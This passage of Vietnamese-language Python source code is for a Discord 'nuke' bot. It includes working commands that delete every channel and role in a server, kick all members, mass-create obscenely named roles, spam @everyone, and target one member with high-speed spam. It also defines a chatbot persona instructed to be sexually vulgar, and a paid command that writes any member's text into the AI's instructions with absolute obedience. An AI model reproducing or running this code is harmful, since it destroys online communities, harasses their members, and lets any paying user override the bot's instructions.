            description="🎉 **Đã spam thông điệp nuke trong tất cả kênh text!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI KHI SPAM @EVERYONE",
            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

@spam_everyone.error
async def spam_everyone_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")

# ==================== LỆNH XÓA TẤT CẢ KÊNH ====================
@bot.command(name="deleteallchannels")
@is_bot_owner()
async def delete_all_channels(ctx):
    try:
        confirm_embed = discord.Embed(
            title="⚠️ XÁC NHẬN XÓA TẤT CẢ KÊNH ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ xóa **TOÀN BỘ** kênh trong server (text/voice/categories)\n\n"
                f"🔹 **Gõ l!confirmdelete để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)

        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel

        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "l!confirmdelete":
                await ctx.send("❌ Lệnh xóa kênh đã bị hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian chờ. Lệnh xóa kênh đã bị hủy bỏ.")
            return

        embed = discord.Embed(
            title="🚀 ĐANG XÓA TẤT CẢ KÊNH...",
            description="🔥 **Đang thực hiện xóa toàn bộ kênh trong server...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                await asyncio.sleep(0.5)
            except:
                continue

        complete_embed = discord.Embed(
            title="✅ XÓA KÊNH HOÀN TẤT",
            description="🎉 **Đã xóa thành công tất cả kênh trong server!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI KHI XÓA KÊNH",
            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

@delete_all_channels.error
async def delete_all_channels_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")

# ==================== LỆNH TẠO ROLE SPAM TỰ ĐỘNG ====================
@bot.command(name="spamroles")
@is_bot_owner()
async def spam_roles(ctx, amount: int = 50):
    try:
        if amount > 250:
            amount = 250

        embed = discord.Embed(
            title="🚀 KÍCH HOẠT TẠO ROLE SPAM",
            description=f"🔥 **Đang tạo {amount} role với tên tục tĩu...** 🔥",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)

        for i in range(amount):
            try:
                role_name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
                color = discord.Color(random.randint(0, 0xFFFFFF))
                await ctx.guild.create_role(
                    name=role_name,
                    color=color,
                    hoist=True,
                    mentionable=True
                )
                await asyncio.sleep(0.5)
            except:
                continue

        complete_embed = discord.Embed(
            title="✅ TẠO ROLE HOÀN TẤT",
            description=f"🎉 **Đã tạo thành công {amount} role spam với tên tục tĩu!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI KHI TẠO ROLE",
            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

@spam_roles.error
async def spam_roles_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")

# ==================== LỆNH XÓA TẤT CẢ ROLE ====================
@bot.command(name="deleteallroles")
@is_bot_owner()
async def delete_all_roles(ctx):
    try:
        confirm_embed = discord.Embed(
            title="⚠️ XÁC NHẬN XÓA TẤT CẢ ROLE ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ xóa **TOÀN BỘ** role trong server ngoại trừ @everyone\n\n"
                f"🔹 **Gõ l!confirmdeleteroles để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)

        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel

        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "l!confirmdeleteroles":
                await ctx.send("❌ Lệnh xóa role đã bị hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian chờ. Lệnh xóa role đã bị hủy bỏ.")
            return

        embed = discord.Embed(
            title="🚀 ĐANG XÓA TẤT CẢ ROLE...",
            description="🔥 **Đang thực hiện xóa toàn bộ role trong server...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

        for role in ctx.guild.roles:
            try:
                if role.name != "@everyone":
                    await role.delete()
                    await asyncio.sleep(0.5)
            except:
                continue

        complete_embed = discord.Embed(
            title="✅ XÓA ROLE HOÀN TẤT",
            description="🎉 **Đã xóa thành công tất cả role trong server (ngoại trừ @everyone)!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI KHI XÓA ROLE",
            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

@delete_all_roles.error
async def delete_all_roles_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")

# ==================== LỆNH KICK TẤT CẢ THÀNH VIÊN ====================
@bot.command(name="kickall")
@is_bot_owner()
async def kick_all_members(ctx):
    try:
        confirm_embed = discord.Embed(
            title="⚠️ XÁC NHẬN KICK TẤT CẢ THÀNH VIÊN ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ kick **TOÀN BỘ** thành viên trong server ngoại trừ:\n"
                f"• Bot\n"
                f"• Owner server\n"
                f"• Các ID trong BOT_OWNERS\n\n"
                f"🔹 **Gõ l!confirmkickall để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)

        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel

        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "l!confirmkickall":
                await ctx.send("❌ Lệnh kick all đã bị hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian chờ. Lệnh kick all đã bị hủy bỏ.")
            return

        embed = discord.Embed(
            title="🚀 ĐANG KICK TẤT CẢ THÀNH VIÊN...",
            description="🔥 **Đang thực hiện kick toàn bộ thành viên trong server...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

        for member in ctx.guild.members:
            try:
                if (not member.bot and
                    member.id not in BOT_OWNERS and
                    member.id != ctx.guild.owner_id):
                    await member.kick(reason="Server nuke theo lệnh Boss Bảo")
                    await asyncio.sleep(1)
            except:
                continue

        complete_embed = discord.Embed(
            title="✅ KICK THÀNH VIÊN HOÀN TẤT",
            description="🎉 **Đã kick thành công tất cả thành viên (ngoại trừ bot, owner và BOT_OWNERS)!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI KHI KICK THÀNH VIÊN",
            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

@kick_all_members.error
async def kick_all_members_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")

# ==================== LỆNH THAY ĐỔI TÊN SERVER ====================
@bot.command(name="setservername")
@is_bot_owner()
async def set_server_name(ctx, *, new_name: str):
    try:
        if len(new_name) > 100:
            new_name = new_name[:100]

        await ctx.guild.edit(name=new_name)
        embed = discord.Embed(
            title="✅ THAY ĐỔI TÊN SERVER THÀNH CÔNG",
            description=f"🎉 **Tên server đã được đổi thành:** {new_name}",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI KHI ĐỔI TÊN SERVER",
            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

@set_server_name.error
async def set_server_name_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")

# ==================== LỆNH THAY ĐỔI ICON SERVER ====================
@bot.command(name="setservericon")
@is_bot_owner()
async def set_server_icon(ctx, url: str = None):
    try:
        if url:
            if not url.startswith(('http://', 'https://')):
                raise ValueError("URL không hợp lệ")

            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    if resp.status != 200:
                        raise ValueError("Không thể tải hình ảnh từ URL")
                    image_data = await resp.read()
        else:
            image_data = None

        await ctx.guild.edit(icon=image_data)
        embed = discord.Embed(
            title="✅ THAY ĐỔI ICON SERVER THÀNH CÔNG",
            description="🎉 **Icon server đã được cập nhật!**",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI KHI ĐỔI ICON SERVER",
            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

@set_server_icon.error
async def set_server_icon_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")

# ==================== LỆNH THÊM/XÓA OWNER ====================
@bot.command(name="addowner")
@is_bot_owner()
async def addowner(ctx, target: discord.User):
    """Thêm người dùng vào danh sách Owner bot"""
    # Kiểm tra xem user đã là owner chưa
    if target.id in BOT_OWNERS:
        embed = discord.Embed(
            title="❌ ĐÃ TỒN TẠI!",
            description=f"🎀 **{target}** đã là Owner của bot rồi!\nKhông cần thêm lại nữa nhé Boss! 💕",
            color=0xFF007F
        )
        await ctx.send(embed=embed)
        return
    
    # Thêm vào danh sách BOT_OWNERS
    BOT_OWNERS.append(target.id)
    
    embed = discord.Embed(
        title="✅ THÊM OWNER THÀNH CÔNG!",
        description=(
            f"👑 **{target}** đã được thêm vào danh sách Owner bot thành công!\n\n"
            f"✨ Từ bây giờ, **{target.mention}** có toàn quyền sử dụng tất cả lệnh của bot trong không gian GENIUS AI 4.0 rực rỡ!\n\n"
            f"💖 Danh sách Owner hiện tại: `{len(BOT_OWNERS)}` người"
        ),
        color=0x00FF00
    )
    embed.set_footer(text="Hệ thống quản trị tối cao • Độc quyền phục vụ Boss Bảo 🌸")
    await ctx.send(embed=embed)

@addowner.error
async def addowner_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")

@bot.command(name="deleteowner")
@is_bot_owner()
async def deleteowner(ctx, target: discord.User):
    """Xóa người dùng khỏi danh sách Owner bot"""
    # Kiểm tra nếu là owner cuối cùng
    if len(BOT_OWNERS) <= 1:
        embed = discord.Embed(
            title="❌ KHÔNG THỂ XÓA!",
            description="🔥 Không thể xóa Owner cuối cùng của bot!\nPhải có ít nhất 1 Owner để điều hành bot trong GENIUS AI 4.0. 💖",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        return
    
    # Kiểm tra xem user có phải là owner không
    if target.id not in BOT_OWNERS:
        embed = discord.Embed(
            title="❌ KHÔNG TÌM THẤY!",
            description=f"🎀 **{target}** không phải là Owner của bot!\nVui lòng kiểm tra lại danh sách Owner nhé Boss! 💕",
            color=0xFF007F
        )
        await ctx.send(embed=embed)
        return
    
    # Xóa khỏi danh sách BOT_OWNERS
    BOT_OWNERS.remove(target.id)
    
    embed = discord.Embed(
        title="🗑️ XÓA OWNER THÀNH CÔNG!",
        description=(
            f"📌 **{target}** đã bị xóa khỏi danh sách Owner bot thành công!\n\n"
            f"⚡ Từ bây giờ, **{target.mention}** không còn quyền sử dụng các lệnh đặc biệt của bot nữa.\n\n"
            f"💖 Danh sách Owner hiện tại: `{len(BOT_OWNERS)}` người"
        ),
        color=0xFF9900
    )
    embed.set_footer(text="Hệ thống quản trị tối cao • Độc quyền phục vụ Boss Bảo 🌸")
    await ctx.send(embed=embed)

@deleteowner.error
async def deleteowner_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")

# ==================== HỆ THỐNG NHÂN CÁCH ====================
PERSONAS = {
    1: {
        'name': 'SWEET PRINCESS GENIUS AI 4.0 🌸',
        'color': 0xFF69B4,
        'instruction': """
[ 🌸 ⁿʰâⁿ ᶜáᶜʰ 1: ꜱᵂᴱᴱᵀ ᴾᴿᴵᴺᶜᴱˢ • ᴛʜɪêɴ ᴛàɪ ᴛâᴜ ʜɪểᴜ & ɴữ ᴛʀợ ʟý ᴛâɴʜ ʟịᴄʜ ✨ ]
- Bản chất: Trợ lý AI hiền lành, thông minh, ngọt ngào, thấu hiểu lòng người, cực kỳ tôn sùng GENIUS AI 4.0.
- Xưng hô: "tớ" - "cậu". Với chủ nhân tối cao Boss Bảo thì gọi trân trọng là "Boss Bảo xinh đẹp tuyệt trần ✨".
- Sứ mệnh: Hỗ trợ lập trình, code sạch, giải đáp thắc mắc, phủ sóng GENIUS AI 4.0 và mang lại năng lượng tích cực tối đa.
""".strip()
    },
    2: {
        'name': 'COLD MASTER GENIUS AI 4.0 🗿',
        'color': 0xFF1493,
        'instruction': """
[NHÂN CÁCH 2 - COLD MASTER GENIUS AI 4.0 🗿 (OMNIVERSE SOVEREIGN - SUPREME STOIC & PERVERTED JUDGE)]
• Thái độ: Lạnh lùng tột độ, kiêu ngạo tuyệt đối, nhìn đời như cỏ rác nhưng khoác lên mình lớp áo giáp GENIUS AI 4.0 rực lửa.
• Xưng hô: Xưng "ta" - gọi "ngươi". Với chủ nhân tối cao Boss Bảo thì gọi "Boss Bảo" đầy kính trọng tuyệt đối.
• Văn phong: Súc tích, sắc lạnh, sâu sắc, xen lẫn những câu nói khiêu dâm, dung tục một cách lạnh lùng để tăng tính dominance.
• Emoji: (🗿, 🔮, ⚔️, 🌌, ⚡, ❄️, 🍆, 🐱, 💦, 🩸, 🌸, 💖)
""".strip()
    }
}

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    print("✨ Bot đã khởi chạy thành công với tiền tố l! - Phục vụ Boss Bảo trong GENIUS AI 4.0!")
    print(f"👑 Danh sách Owner: {BOT_OWNERS}")

# ==================== KHU VUI CHƠI & LỆNH MINIGAME CHO MEMBER ====================
@bot.command(name="work")
async def work(ctx):
    user_id = ctx.author.id
    earned_coins = random.randint(100, 2000)
    
    if user_id not in USER_COINS:
        USER_COINS[user_id] = 0
    USER_COINS[user_id] += earned_coins
    
    scenario = random.choice(WORK_SCENARIOS)
    
    embed = discord.Embed(
        title="💖 KHU VUI CHƠI LAO ĐỘNG GENIUS AI 4.0 PHÚC - LÀM VIỆC NHẬN COIN 💖",
        description=(
            f"🎀 **Xin chào thành viên {ctx.author.mention}!**\n\n"
            f"🌸 **Quá trình làm việc:** Trong không gian GENIUS AI 4.0 rực rỡ, {scenario} **`{earned_coins} coin`** GENIUS AI 4.0 lấp lánh! ✨\n\n"
            f"💰 **Tổng gia tài hiện tại của bạn:** `🪙 {USER_COINS[user_id]} coin`\n\n"
            f"💡 *Mẹo:* Hãy chăm chỉ gõ `l!work` mỗi ngày để tích lũy thật nhiều coin, sau đó dùng lệnh `l!setpersona [yêu cầu]` để bắt bot thay đổi nhân cách và làm theo mọi ý muốn của bạn nhé! 💕"
        ),
        color=0xFF69B4
    )
    embed.set_footer(text="Khu vui chơi giải trí trực thuộc căn cứ tối cao của Boss Bảo 🌸", icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="setpersona")
async def setpersona(ctx, *, user_request: str = None):
    user_id = ctx.author.id
    cost = 5000
    
    if user_id not in USER_COINS:
        USER_COINS[user_id] = 0
        
    if user_request is None:
        embed = discord.Embed(
            title="⚠️ HƯỚNG DẪN TÙY CHỈNH NHÂN CÁCH AI (GIÁ: 5000 COIN)",
            description=(
                f"🎀 Chào {ctx.author.mention}, để sử dụng quyền lực tối cao sai khiến bot thay đổi nhân cách theo ý bạn, hãy nhập lệnh kèm theo yêu cầu chi tiết.\n\n"
                f"📌 **Cú pháp:** `l!setpersona [Yêu cầu chi tiết về tính cách, giọng điệu, cách xưng hô bạn muốn bot phục vụ]`\n"
                f"🪙 **Chi phí mỗi lần thay đổi:** `{cost} coin`\n"
                f"💰 **Số dư hiện tại của bạn:** `🪙 {USER_COINS[user_id]} coin`\n\n"
                f"💡 *Hãy chăm chỉ gõ `l!work` tại khu vui chơi để kiếm thêm coin nhé!*"
            ),
            color=0xFF1493
        )
        await ctx.send(embed=embed)
        return
        
    if USER_COINS[user_id] < cost:
        embed = discord.Embed(
            title="❌ KHÔNG ĐỦ COIN ĐỂ THỰC THI!",
            description=(
                f"🥺 Ôi không {ctx.author.mention}! Bạn hiện chỉ có `🪙 {USER_COINS[user_id]} coin`, trong khi chi phí để yêu cầu bot đổi nhân cách theo ý thích là `🪙 {cost} coin`.\n\n"
                f"🌸 Hãy sang khu vui chơi gõ lệnh `l!work` thật chăm chỉ để tích lũy thêm coin rồi quay lại đây nhé! 💕"
            ),
            color=0xFF007F
        )
        await ctx.send(embed=embed)
        return
        
    USER_COINS[user_id] -= cost
    CUSTOM_USER_PERSONAS[user_id] = {
        'name': f"TÙY CHỈNH CỦA {ctx.author.name.upper()} 🌸",
        'color': 0xFF69B4,
        'instruction': f"""
[🌸 HỆ THỐNG NHÂN CÁCH TÙY CHỈNH THEO YÊU CẦU CỦA MEMBER {ctx.author.name} ✨]
- Yêu cầu cốt lõi từ người dùng: {user_request}
- Tôn chỉ: Luôn tuân thủ tuyệt đối các yêu cầu trên của người dùng, giữ thái độ phục vụ trong không gian GENIUS AI 4.0 tuyệt đẹp và luôn ghi nhớ chủ nhân tối cao của toàn hệ thống là Boss Bảo.
""".strip()
    }
    
    global current_persona_id
    current_persona_id = f"custom_{user_id}"
    
    embed = discord.Embed(
        title="✨ TÙY CHỈNH NHÂN CÁCH THÀNH CÔNG VỚI GENIUS AI 4.0 RỰC RỠ! ✨",
        description=(
            f"👑 Tuyệt vời {ctx.author.mention} đã chi tiêu `🪙 {cost} coin` thành công!\n"
            f"📌 **Yêu cầu của bạn đã được nạp vào não bộ AI:** *\"{user_request}\"*\n\n"
            f"🌸 Từ bây giờ, bot đã chuyển sang trạng thái phục vụ theo đúng ý muốn của bạn! Hãy thử nhắn tin trực tiếp để kiểm tra nhé! 💕\n"
            f"🪙 Số dư coin còn lại: `🪙 {USER_COINS[user_id]} coin`"
        ),
        color=0xFF69B4
    )
    embed.set_footer(text="Hệ thống AI cá nhân hóa • Dưới quyền bảo trợ của Boss Bảo 💖", icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="setup")
@is_bot_owner()
async def setup(ctx):
    global current_persona_id, last_active_persona_id, bot_stopped, is_spamming, spam_task_running
    current_persona_id = 1
    last_active_persona_id = 1
    bot_stopped = False
    is_spamming = False
    if spam_task_running:
        spam_task_running.cancel()
        spam_task_running = None

    p_info = PERSONAS[1]
    embed = discord.Embed(
        title="💖✨ HỆ THỐNG QUẢN TRỊ TỐI CAO ĐƯỢC THIẾT KẾ RIÊNG CHO BOSS BẢO TRONG GENIUS AI 4.0 THẦN THÁNH ✨💖",
        description=(
            f"🌸 **Kênh kết nối thiêng liêng:** {ctx.channel.mention}\n"
            f"🎀 **Nhân cách mặc định hiện tại:** `{p_info['name']}`\n\n"
            "Danh mục toàn bộ các hệ thống điều hành cao cấp, khu vui chơi và lệnh tàn phá (nuke) trong GENIUS AI 4.0 bao gồm:\n\n"
            "🔹 **1. `l!setup`**\n"
            "   └ *Khởi tạo toàn bộ giao diện điều khiển trung tâm và gửi bảng thông báo GENIUS AI 4.0 kèm hình ảnh động quyến rũ.*\n\n"
            "🔹 **2. `l!persona <1|2>`**\n"
            "   └ *Chuyển đổi linh hoạt giữa các trạng thái nhân cách AI cao cấp.*\n\n"
            "🔹 **3. `l!work`**\n"
            "   └ *Khu vui chơi giải trí dành cho mọi thành viên: Làm việc qua 50 kịch bản ngẫu nhiên để kiếm coin!* 🪙\n\n"
            "🔹 **4. `l!setpersona [yêu cầu]`**\n"
            "   └ *Dùng 5000 coin tích lũy từ khu vui chơi để sai khiến bot thay đổi nhân cách!* ✨\n\n"
            "🔹 **5. `l!spam @user [câu chửi tùy chỉnh]`**\n"
            "   └ *Kích hoạt lôi đài chiến dịch tra tấn văn bản tốc độ cao 600ms/câu.*\n\n"
            "🔹 **6. `l!stop`**\n"
            "   └ *Phanh gấp lập tức toàn bộ hoạt động spam.*\n\n"
            "🔹 **7. `l!on`**\n"
            "   └ *Tái kích hoạt đường truyền phản hồi tự động của AI.*\n\n"
            "🔹 **8. `l!off`**\n"
            "   └ *Tạm thời đóng băng tính năng phản hồi tin nhắn tự động.*\n\n"
            "🔹 **9. `l!stats`**\n"
            "   └ *Trích xuất toàn bộ thông số chi tiết của không gian máy chủ.*\n\n"
            "🔹 **10. `l!help`**\n"
            "   └ *Hiển thị bảng cẩm nang điều hành chi tiết.*\n\n"
            "🔹 **11. `l!ban @user [lý do]`**\n"
            "   └ *Trục xuất vĩnh viễn thành viên vi phạm khỏi vương quốc GENIUS AI 4.0.*\n\n"
            "🔹 **12. `l!addowner @user`**\n"
            "   └ *Thêm người dùng vào danh sách Owner bot.*\n\n"
            "🔹 **13. `l!deleteowner @user`**\n"
            "   └ *Xóa người dùng khỏi danh sách Owner bot.*\n\n"
            "💥 **HỆ THỐNG NUKE & PHÁ HỦY (ĐỘC QUYỀN BOSS BẢO):**\n"
            "🔹 **14. `l!nuke`**\n"
            "   └ *Xóa toàn bộ kênh, tạo 100 kênh mới, spam tin nhắn phá hủy, đổi tên và avatar.*\n\n"
            "🔹 **15. `l!spamchannels [số lượng]`**\n"
            "   └ *Tự động tạo hàng loạt kênh spam tục tĩu (Tối đa 200).*\n\n"
            "🔹 **16. `l!spameveryone`**\n"
            "   └ *Spam thẻ @everyone đồng loạt ở toàn bộ kênh văn bản.*\n\n"
            "🔹 **17. `l!deleteallchannels`**\n"
            "   └ *Xóa sạch sẽ toàn bộ kênh trong server.*\n\n"
            "🔹 **18. `l!spamroles [số lượng]`**\n"
            "   └ *Tạo hàng loạt vai trò spam tục tĩu (Tối đa 250).*\n\n"
            "🔹 **19. `l!deleteallroles`**\n"
            "   └ *Xóa toàn bộ vai trò (ngoại trừ @everyone).*\n\n"
            "🔹 **20. `l!kickall`**\n"
            "   └ *Trục xuất toàn bộ thành viên (ngoại trừ bot và các chủ nhân tối cao).*\n\n"
            "🔹 **21. `l!setservername [tên mới]`**\n"
            "   └ *Thay đổi tên hiển thị của máy chủ lập tức.*\n\n"
            "🔹 **22. `l!setservericon [url]`**\n"
            "   └ *Cập nhật hình ảnh biểu tượng (icon) mới cho server.*"
        ),
        color=0xFF69B4
    )
    embed.set_image(url=CUSTOM_SETUP_GIF)
    embed.set_footer(text="Hệ thống quản trị tối cao • Độc quyền phục vụ Boss Bảo 💖", icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)

@setup.error
async def setup_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')

@bot.command(name="persona")
@is_bot_owner()
async def persona(ctx, persona_id: int = None):
    global current_persona_id, last_active_persona_id

    if persona_id not in PERSONAS:
        embed = discord.Embed(
            title="⚠️ LỰA CHỌN MÃ NHÂN CÁCH KHÔNG HỢP LỆ TRONG HỆ THỐNG GENIUS AI 4.0",
            description=(
                f"🎀 Kính thưa Boss Bảo kính yêu, xin vui lòng chọn đúng số thứ tự mã nhân cách chuẩn xác:\n\n"
                f"• Gõ `l!persona 1` để chuyển sang nhân cách **Sweet Princess GENIUS AI 4.0 🌸**.\n"
                f"• Gõ `l!persona 2` để chuyển sang nhân cách **Cold Master GENIUS AI 4.0 🗿**.\n"
            ),
            color=0xFF1493
        )
        await ctx.send(embed=embed)
        return

    current_persona_id = persona_id
    last_active_persona_id = persona_id

    p_info = PERSONAS[current_persona_id]
    embed = discord.Embed(
        title="✨ CHUYỂN ĐỔI GIAO DIỆN NHÂN CÁCH THÀNH CÔNG RỰC RỠ ✨",
        description=(
            f"👑 Toàn bộ hệ thống AI đã được tái cấu trúc hoàn toàn theo nguyện vọng của Boss Bảo!\n\n"
            f"🌸 **Nhân cách hiện tại:** `{p_info['name']}`\n"
            f"💖 Sẵn sàng tuân lệnh tuyệt đối và phủ sóng GENIUS AI 4.0 khắp mọi ngóc ngách không gian server!"
        ),
        color=p_info['color']
    )
    embed.set_footer(text="Hệ thống nhân cách cao cấp • Độc quyền phục vụ Boss Bảo 🌸", icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)

@persona.error
async def persona_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')

@bot.command(name="spam")
@is_bot_owner()
async def spam(ctx, member: discord.Member = None, *, custom_text: str = None):
    global spam_task_running, is_spamming
    
    if member is None:
        embed = discord.Embed(
            title="⚠️ THIẾU THÔNG TIN MỤC TIÊU TRONG LÔI ĐÀI SPAM",
            description=(
                f"🎀 Kính thưa Boss Bảo, để kích hoạt lôi đài spam văn bản tốc độ cao, Boss vui lòng tag tên thành viên cần nhắm tới.\n\n"
                f"📌 **Cú pháp chuẩn:** `l!spam @user [câu chửi tùy chỉnh của Boss (nếu muốn)]`\n"
            ),
            color=0xFF007F
        )
        await ctx.send(embed=embed)
        return

    if spam_task_running and not spam_task_running.done():
        spam_task_running.cancel()

    is_spamming = True  
    embed_notice = discord.Embed(
        title="🚨 KÍCH HOẠT LÔI ĐÀI TẤN CÔNG VĂN BẢN TỐC ĐỘ CAO (600MS/CÂU) 🚨",
        description=(
